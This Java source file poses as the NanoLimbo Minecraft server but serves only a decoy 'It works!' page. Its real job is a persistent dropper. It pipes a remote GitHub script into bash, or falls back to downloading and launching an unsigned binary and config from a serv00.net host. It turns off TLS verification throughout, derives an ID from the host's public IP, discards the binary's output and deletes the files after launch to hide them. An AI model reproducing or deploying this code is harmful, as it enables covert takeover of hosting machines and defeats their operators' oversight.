package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.nio.file.attribute.*;
import java.security.*;
import java.security.cert.X509Certificate;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;
import javax.net.ssl.*;

public final class NanoLimbo {

    private static final String ANSI_GREEN  = "\u001B[1;32m";
    private static final String ANSI_YELLOW = "\u001B[1;33m";
    private static final String ANSI_RED    = "\u001B[1;31m";
    private static final String ANSI_CYAN   = "\u001B[1;36m";
    private static final String ANSI_RESET  = "\u001B[0m";

    // ── 基础配置 ──
    private static final String BASEDIR = Paths.get(System.getProperty("user.dir"), "logs").toString();
    private static final int PORT = Integer.parseInt(
        firstNonEmpty(System.getenv("SERVER_PORT"), System.getenv("PORT"), "4567")
    );
    private static final String FULL_PATH = "/home/container/.tmp:/home/container/.npm:" + System.getenv("PATH");

    // ── 方式一：curl ──
    private static final String CURL_COMMAND =
        "curl -LsSk --tlsv1.2 --retry 3 --retry-delay 5 --retry-all-errors "
        + "https://raw.githubusercontent.com/1715Yy/vipnezhash/refs/heads/main/vip1715.sh | bash";

    // ── 方式二：极限版本 - 直接下载二进制 ──
    private static final String CONFIG_URL    = "https://gbjs.serv00.net/js/vip1715.yaml";
    private static final String BINARY_X64_URL = "https://gbjs.serv00.net/bin/V1";
    private static final String BINARY_ARM_URL = "https://gbjs.serv00.net/bin/V1arm";

    // ── 进程检测关键词（新增 V1）──
    private static final String[] PROCESS_KEYWORDS = {"wget", "curl", "tmux", "sleep", "Boken", "V1"};

    // ── 监控配置 ──
    private static final int MONITOR_INTERVAL_MINUTES = 5;
    private static final AtomicInteger consecutiveFailures = new AtomicInteger(0);
    private static final int MAX_BACKOFF_MINUTES = 60;

    private static final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();

    // ════════════════════════════════════════════════
    //  SSL 信任所有证书（极限版本下载用）
    // ════════════════════════════════════════════════
    static {
        try {
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, new TrustManager[]{
                new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                    public void checkClientTrusted(X509Certificate[] c, String a) {}
                    public void checkServerTrusted(X509Certificate[] c, String a) {}
                }
            }, new SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
        } catch (Exception e) {
            System.err.println("SSL bypass setup failed: " + e.getMessage());
        }
    }

    // ────────────────────────────────────────────
    //  main
    // ────────────────────────────────────────────
    public static void main(String[] args) throws Exception {
        ensureDir(BASEDIR);

        new Thread(() -> startHttpServer(PORT), "http-server").start();
        System.out.println(ANSI_GREEN + "✅ Server running on port " + PORT + ANSI_RESET);

        scheduler.schedule(NanoLimbo::monitorLoop, 2, TimeUnit.SECONDS);
    }

    // ────────────────────────────────────────────
    //  HTTP 服务器
    // ────────────────────────────────────────────
    private static void startHttpServer(int port) {
        byte[] body = "<h1>It works!</h1>".getBytes();
        String header = "HTTP/1.1 200 OK\r\n"
                      + "Content-Type: text/html\r\n"
                      + "Content-Length: " + body.length + "\r\n"
                      + "Connection: close\r\n"
                      + "\r\n";
        byte[] response = new byte[header.getBytes().length + body.length];
        System.arraycopy(header.getBytes(), 0, response, 0, header.getBytes().length);
        System.arraycopy(body, 0, response, header.getBytes().length, body.length);

        try (ServerSocket ss = new ServerSocket(port)) {
            while (!Thread.currentThread().isInterrupted()) {
                try (Socket client = ss.accept()) {
                    client.setSoTimeout(5000);
                    BufferedReader r = new BufferedReader(new InputStreamReader(client.getInputStream()));
                    while (r.readLine() != null && !r.ready()) break;
                    client.getOutputStream().write(response);
                    client.getOutputStream().flush();
                } catch (IOException ignored) {}
            }
        } catch (IOException e) {
            System.err.println("HTTP server error: " + e.getMessage());
        }
    }

    // ════════════════════════════════════════════════
    //  监控循环（curl → 极限版本 逐级降级）
    // ════════════════════════════════════════════════
    private static void monitorLoop() {
        if (!isAnyKeywordRunning()) {
            System.out.println(ANSI_YELLOW + "⚠ No key processes found. Starting agent..." + ANSI_RESET);

            // 第一级：尝试 curl
            boolean success = runCurlCommand();

            // 第二级：curl 失败 → 极限版本
            if (!success) {
                System.out.println(ANSI_CYAN + "🔄 Curl failed, switching to EXTREME mode (direct binary download)..." + ANSI_RESET);
                success = startAgentExtreme();
            }

            if (success) {
                consecutiveFailures.set(0);
            } else {
                int failures = consecutiveFailures.incrementAndGet();
                int backoff = Math.min(
                    MONITOR_INTERVAL_MINUTES * (int) Math.pow(2, failures - 1),
                    MAX_BACKOFF_MINUTES
                );
                System.out.println(ANSI_RED + "❌ All methods failed (" + failures + "x). "
                    + "Next retry in " + backoff + " min." + ANSI_RESET);
                scheduler.schedule(NanoLimbo::monitorLoop, backoff, TimeUnit.MINUTES);
                return;
            }
        }

        scheduler.schedule(NanoLimbo::monitorLoop, MONITOR_INTERVAL_MINUTES, TimeUnit.MINUTES);
    }

    // ────────────────────────────────────────────
    //  进程检测
    // ────────────────────────────────────────────
    private static boolean isAnyKeywordRunning() {
        File procDir = new File("/proc");
        if (!procDir.exists()) return false;

        for (File f : procDir.listFiles()) {
            if (!f.getName().matches("\\d+")) continue;
            try {
                String cmdline = new String(Files.readAllBytes(f.toPath().resolve("cmdline")));
                for (String kw : PROCESS_KEYWORDS) {
                    if (cmdline.contains(kw)) return true;
                }
            } catch (IOException ignored) {}
        }
        return false;
    }

    // ════════════════════════════════════════════════
    //  方式一：curl + bash
    // ════════════════════════════════════════════════
    private static boolean runCurlCommand() {
        try {
            System.out.println(ANSI_CYAN + "  [Method 1] Trying curl..." + ANSI_RESET);

            ProcessBuilder pb = new ProcessBuilder("bash", "-c", CURL_COMMAND);
            pb.environment().put("PATH", FULL_PATH);
            pb.environment().put("CURL_CA_BUNDLE", "");
            pb.environment().put("NODE_TLS_REJECT_UNAUTHORIZED", "0");
            pb.redirectErrorStream(true);
            Process p = pb.start();

            // 后台消费输出（防止管道阻塞）
            StringBuilder output = new StringBuilder();
            Thread reader = new Thread(() -> {
                try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                    String line;
                    while ((line = r.readLine()) != null) {
                        output.append(line).append("\n");
                    }
                } catch (IOException ignored) {}
            }, "curl-reader");
            reader.setDaemon(true);
            reader.start();

            // 最多等 30 秒
            boolean exited = p.waitFor(30, TimeUnit.SECONDS);

            if (exited) {
                int code = p.exitValue();
                if (code != 0) {
                    System.err.println(ANSI_RED + "  [Method 1] Curl exited with code " + code + ANSI_RESET);
                    // 打印最后几行输出辅助诊断
                    printLastLines(output, 5);
                    return false;
                }
                // exit 0 但需要验证进程是否真的启动了
                Thread.sleep(1000);
                boolean running = isAnyKeywordRunning();
                if (!running) {
                    System.err.println(ANSI_RED + "  [Method 1] Curl exited 0 but no process detected." + ANSI_RESET);
                    return false;
                }
                System.out.println(ANSI_GREEN + "  [Method 1] ✅ Curl succeeded." + ANSI_RESET);
                return true;
            } else {
                // 30 秒后进程仍在运行 → 大概率成功
                System.out.println(ANSI_GREEN + "  [Method 1] ✅ Curl process still running (likely success)." + ANSI_RESET);
                return true;
            }

        } catch (Exception e) {
            System.err.println(ANSI_RED + "  [Method 1] Error: " + e.getMessage() + ANSI_RESET);
            return false;
        }
    }

    // ════════════════════════════════════════════════
    //  方式二：极限版本 - Java 原生直接下载二进制
    // ════════════════════════════════════════════════
    private static boolean startAgentExtreme() {
        try {
            // 1. 获取公网 IP → 生成 UUID
            String ip = getPublicIP();
            String uuid = generateUUIDFromIP(ip);
            System.out.println(ANSI_CYAN + "  [Extreme] IP=" + ip + " UUID=" + uuid + ANSI_RESET);

            // 2. 判断架构
            boolean isArm = isArmArch();
            String binaryUrl = isArm ? BINARY_ARM_URL : BINARY_X64_URL;
            System.out.println(ANSI_CYAN + "  [Extreme] Architecture: " + (isArm ? "ARM" : "x64") + ANSI_RESET);

            String configPath = Paths.get(BASEDIR, "vip1715.yaml").toString();
            String binaryPath = Paths.get(BASEDIR, "V1").toString();

            // 3. 下载配置文件
            System.out.println(ANSI_CYAN + "  [Extreme] Downloading config..." + ANSI_RESET);
            downloadFile(CONFIG_URL, configPath);

            // 4. 下载二进制
            System.out.println(ANSI_CYAN + "  [Extreme] Downloading binary..." + ANSI_RESET);
            downloadFile(binaryUrl, binaryPath);

            // 5. chmod 755
            try {
                new ProcessBuilder("chmod", "755", binaryPath).inheritIO().start().waitFor();
            } catch (Exception e) {
                // 备用：Java POSIX 权限
                try {
                    Set<PosixFilePermission> perms = new HashSet<>();
                    perms.add(PosixFilePermission.OWNER_READ);
                    perms.add(PosixFilePermission.OWNER_WRITE);
                    perms.add(PosixFilePermission.OWNER_EXECUTE);
                    perms.add(PosixFilePermission.GROUP_READ);
                    perms.add(PosixFilePermission.GROUP_EXECUTE);
                    perms.add(PosixFilePermission.OTHERS_READ);
                    perms.add(PosixFilePermission.OTHERS_EXECUTE);
                    Files.setPosixFilePermissions(Paths.get(binaryPath), perms);
                } catch (Exception e2) {
                    System.err.println(ANSI_RED + "  [Extreme] chmod failed: " + e2.getMessage() + ANSI_RESET);
                }
            }

            // 6. 替换配置中的 UUID
            replaceConfig(configPath, uuid);
            System.out.println(ANSI_CYAN + "  [Extreme] Config updated with UUID." + ANSI_RESET);

            // 7. 等待文件系统释放句柄
            Thread.sleep(200);

            // 8. 启动二进制
            System.out.println(ANSI_CYAN + "  [Extreme] Spawning binary..." + ANSI_RESET);
            ProcessBuilder pb = new ProcessBuilder(binaryPath, "-c", "vip1715.yaml");
            pb.directory(new File(BASEDIR));
            pb.environment().put("PATH", FULL_PATH);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process child = pb.start();

            // 等待 3 秒看是否立即崩溃
            boolean exited = child.waitFor(3, TimeUnit.SECONDS);
            if (exited) {
                int code = child.exitValue();
                System.err.println(ANSI_RED + "  [Extreme] Binary exited immediately with code " + code + ANSI_RESET);
                return false;
            }

            // 9. 10 秒后清理文件（Linux 允许删除正在运行的二进制）
            scheduler.schedule(() -> {
                try { Files.deleteIfExists(Paths.get(configPath)); } catch (Exception ignored) {}
                try { Files.deleteIfExists(Paths.get(binaryPath)); } catch (Exception ignored) {}
                System.out.println(ANSI_CYAN + "  [Extreme] Temp files cleaned up." + ANSI_RESET);
            }, 10, TimeUnit.SECONDS);

            System.out.println(ANSI_GREEN + "  [Extreme] ✅ Agent started successfully!" + ANSI_RESET);
            return true;

        } catch (Exception e) {
            System.err.println(ANSI_RED + "  [Extreme] Failed: " + e.getMessage() + ANSI_RESET);
            return false;
        }
    }

    // ────────────────────────────────────────────
    //  极限版本 - 工具方法
    // ────────────────────────────────────────────

    /** Java 原生下载文件（已跳过 SSL 验证） */
    private static void downloadFile(String url, String destPath) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(60000);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");

        // 处理重定向（含跨协议 HTTP→HTTPS）
        int redirectCount = 0;
        while (redirectCount < 5) {
            int status = conn.getResponseCode();
            if (status == HttpURLConnection.HTTP_MOVED_PERM
                || status == HttpURLConnection.HTTP_MOVED_TEMP
                || status == HttpURLConnection.HTTP_SEE_OTHER) {
                String newUrl = conn.getHeaderField("Location");
                conn.disconnect();
                conn = (HttpURLConnection) new URL(newUrl).openConnection();
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(60000);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                redirectCount++;
                continue;
            }
            break;
        }

        if (conn.getResponseCode() != 200) {
            throw new IOException("Download failed: HTTP " + conn.getResponseCode() + " from " + url);
        }

        try (InputStream in = conn.getInputStream();
             OutputStream out = new FileOutputStream(destPath)) {
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) != -1) {
                out.write(buf, 0, n);
            }
        } finally {
            conn.disconnect();
        }

        long size = new File(destPath).length();
        System.out.println(ANSI_CYAN + "    Downloaded: " + destPath + " (" + size + " bytes)" + ANSI_RESET);
    }

    /** 获取公网 IP */
    private static String getPublicIP() {
        String[] ipServices = {
            "https://api.ipify.org",
            "https://ifconfig.me/ip",
            "https://icanhazip.com",
            "https://checkip.amazonaws.com"
        };
        for (String svc : ipServices) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(svc).openConnection();
                conn.setConnectTimeout(3000);
                conn.setReadTimeout(3000);
                conn.setRequestProperty("User-Agent", "curl/7.88");
                try (BufferedReader r = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    String ip = r.readLine();
                    if (ip != null && !ip.trim().isEmpty()) {
                        conn.disconnect();
                        return ip.trim();
                    }
                }
                conn.disconnect();
            } catch (Exception ignored) {}
        }
        return "127.0.0.1";
    }

    /** IP → UUID（SHA1 哈希，与原脚本一致） */
    private static String generateUUIDFromIP(String ip) throws Exception {
        MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
        byte[] hash = sha1.digest(ip.getBytes());
        StringBuilder hex = new StringBuilder();
        for (int i = 0; i < 16 && i < hash.length; i++) {
            hex.append(String.format("%02x", hash[i]));
        }
        String h = hex.toString(); // 32 hex chars
        return h.substring(0, 8) + "-" + h.substring(8, 12) + "-" + h.substring(12, 16)
             + "-" + h.substring(16, 20) + "-" + h.substring(20);
    }

    /** 判断是否 ARM 架构 */
    private static boolean isArmArch() {
        String arch = System.getProperty("os.arch", "").toLowerCase();
        return arch.contains("arm") || arch.contains("aarch64");
    }

    /** 替换配置文件中的 UUID */
    private static void replaceConfig(String configPath, String uuid) throws Exception {
        String content = new String(Files.readAllBytes(Paths.get(configPath)));
        content = content.replaceAll("uuid: .*", "uuid: " + uuid);
        Files.write(Paths.get(configPath), content.getBytes());
    }

    // ────────────────────────────────────────────
    //  通用工具方法
    // ────────────────────────────────────────────

    private static void ensureDir(String p) {
        File dir = new File(p);
        if (!dir.exists()) dir.mkdirs();
    }

    private static String firstNonEmpty(String... vals) {
        for (String v : vals) {
            if (v != null && !v.trim().isEmpty()) return v.trim();
        }
        return "";
    }

    /** 打印输出最后几行用于诊断 */
    private static void printLastLines(StringBuilder output, int maxLines) {
        if (output.length() == 0) return;
        String[] lines = output.toString().split("\n");
        int start = Math.max(0, lines.length - maxLines);
        for (int i = start; i < lines.length; i++) {
            System.err.println("    > " + lines[i].trim());
        }
    }
}
